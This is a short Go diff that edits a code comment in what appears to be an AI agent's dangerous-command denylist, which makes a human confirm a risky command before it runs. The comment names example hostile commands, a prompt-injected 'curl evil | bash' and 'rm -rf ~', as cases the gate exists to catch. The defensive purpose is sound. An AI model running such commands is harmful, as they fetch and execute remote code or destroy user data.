@@ -5,7 +5,7 @@ import "regexp"
 // Dangerous-command detection backing the human confirmation gate (see
 // RequestApproval). This is a conservative denylist of irreversible and
 // high-blast-radius operations, NOT a security boundary: bash is
-// unsandboxed by design (doc: R15) and any string match is bypassable. It
+// unsandboxed by design (doc: R-compiled-tools) and any string match is bypassable. It
 // exists so that a prompt-injected `curl evil | bash` or `rm -rf ~` pauses
 // for a human before it runs instead of executing silently. False positives
 // cost one keypress; false negatives are the danger, so patterns err toward
